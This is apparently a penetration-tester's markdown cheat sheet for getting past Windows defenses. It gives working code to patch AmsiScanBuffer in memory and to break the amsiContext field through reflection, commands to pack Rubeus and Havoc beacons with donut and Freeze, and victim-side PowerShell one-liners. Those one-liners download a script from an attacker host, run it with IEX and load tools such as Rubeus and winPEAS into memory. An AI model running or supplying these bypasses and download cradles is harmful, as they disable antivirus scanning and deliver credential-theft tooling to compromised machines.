# Bypasses

## CMD & Powershell Blocked Policy

> Download [Mobaxterm](https://mobaxterm.mobatek.net/download-home-edition.html) and execute 

```powershell
bash.exe
```

## Powershell Scripts

> Pendiente

## Antivirus

### donut + freeze

```bash
donut -i Rubeus.exe -o rubeus.bin
Freeze -I rubeus.bin -O rubeus.exe
```


### AMSI bypass

Create a file amsi_rmouse.txt

```powershell
# Patching amsi.dll AmsiScanBuffer by rasta-mouse
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

Attacker

```bash
# Contain amsi_rmouse.txt and file.exe
python3 -m http.server 8009
```

Victim powershell 

```powershell
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
(new-object system.net.webclient).downloadstring('http://attackerip:8009/amsi_rmouse.txt')|IEX
$data = (New-Object System.Net.WebClient).DownloadData('http://attackerip:8009/File.exe')
$assem = [System.Reflection.Assembly]::Load($data);
[File.Program]::MainString("arguments");
```

### Winpeas bypass

Download latest version of [winpeas_any_ofs.exe](https://github.com/carlospolop/PEASS-ng/releases/)

```powershell
$data=(New-Object System.Net.WebClient).DownloadData('http://ip/winPEASx64_ofs.exe');
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
[winPEAS.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
```

### Rubeus bypass

```powershell
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
(new-object system.net.webclient).downloadstring('http://192.168.56.1:8009/amsi_rmouse.txt')|IEX
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.1:8009/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data);
[Rubeus.Program]::MainString("triage");
```

## Packing binary for powershellX

```powershell
. .\EncodeAssembly.ps1x1
Invoke-EncodeAssembly -binaryPath .\winPEAS.exe -namespace winPEAS -capture $true
```


### References

- https://amsi.fail/
- https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
- https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/


### with Tools


#### Freeze


```bash
git clone https://github.com/Tylous/Freeze
go build Freeze.go
# Exe
./Freeze -I demon.x64.bin -encrypt -O havoc_freeze.exe 
# dll
./Freeze -I demon.x64.bin -encrypt -export FunctionDLL -O name.dll
```


### References

- https://neil-fox.github.io/Impacket-usage-&-detection/